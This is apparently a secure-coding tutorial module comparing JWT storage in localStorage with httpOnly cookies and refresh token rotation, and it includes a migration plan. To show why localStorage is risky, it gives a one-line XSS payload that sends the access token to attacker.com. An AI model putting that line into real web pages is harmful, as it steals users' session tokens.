# M07: JWT Auth — Old vs Modern

## The Old Way: localStorage + Long-Lived Tokens

### Pattern (2015–2019)

```javascript
// Client stores JWT in localStorage after login
localStorage.setItem('access_token', response.data.token);

// Client manually attaches to every request
fetch('/api/protected', {
  headers: {
    'Authorization': 'Bearer ' + localStorage.getItem('access_token')
  }
});

// Token expires in 24 hours
```

### Why It Was Popular

- Easy to understand for SPA developers
- Works across domains (no cookie same-origin restrictions)
- "Stateless" felt modern and scalable

### Why It Is Dangerous

1. **XSS vulnerability = total compromise**
   Any XSS payload can exfiltrate the token:
   ```javascript
   fetch('https://attacker.com/?token=' + localStorage.getItem('access_token'));
   ```

2. **No automatic expiration handling**
   Developers often forget to handle 401 responses and redirect to login.

3. **Token size unbounded**
   localStorage has ~5MB limit, but JWTs can grow with claims. No built-in transport mechanism.

4. **No built-in security attributes**
   Unlike cookies, there is no `Secure`, `HttpOnly`, or `SameSite` equivalent for localStorage.

---

## The Modern Way: httpOnly Cookies + Refresh Rotation

### Pattern (2020–present)

```http
# Login response sets TWO cookies
Set-Cookie: access_token=<short_jwt>; HttpOnly; Secure; SameSite=Strict; Path=/api; Max-Age=900
Set-Cookie: refresh_token=<opaque_token>; HttpOnly; Secure; SameSite=Strict; Path=/api/auth/refresh; Max-Age=604800
```

```javascript
// Client makes requests normally—browser attaches cookie automatically
fetch('/api/protected'); // Cookie sent by browser

// On 401, client calls refresh endpoint
const res = await fetch('/api/auth/refresh', { method: 'POST' });
// Server sets new access_token cookie
```

### Security Attributes Explained

| Attribute | Purpose |
|-----------|---------|
| `HttpOnly` | Prevents JavaScript from reading the cookie. Blocks XSS theft. |
| `Secure` | Cookie only sent over HTTPS. Prevents network sniffing. |
| `SameSite=Strict` | Cookie never sent on cross-site requests. Blocks CSRF. |
| `SameSite=Lax` | Cookie sent on top-level navigation GETs. Balanced UX/security. |
| `Path=/api` | Limits cookie to API routes. Reduces attack surface. |

### Refresh Token Rotation

```
Client           Server (Auth Service)
  |                    |
  |--- POST /refresh ->|
  |   (refresh_token)  |
  |                    |-- Validate & hash-match in DB
  |                    |-- Delete old refresh token
  |                    |-- Issue NEW access + refresh tokens
  |<- Set-Cookie: ...--|
```

**Benefit:** If an attacker steals a refresh token and uses it, the legitimate user's next refresh attempt will fail (token already used). The server detects the theft and invalidates the entire token family.

---

## Migration Path

If you currently use localStorage:

1. **Phase 1:** Move access token to httpOnly cookie
   - Change login endpoint to `Set-Cookie` instead of JSON body
   - Update frontend to stop reading from localStorage

2. **Phase 2:** Implement refresh token rotation
   - Add refresh token table in DB (token_hash, user_id, expires_at, used)
   - Add `/auth/refresh` endpoint

3. **Phase 3:** Add token binding
   - Hash refresh tokens with a device fingerprint or IP subnet
   - Invalidate on mismatch (prevents token replay across devices)

4. **Phase 4:** Implement explicit revocation
   - Add `/auth/logout` that invalidates the refresh token family
   - Maintain a blocklist of `jti` values for access tokens (short TTL in Redis)
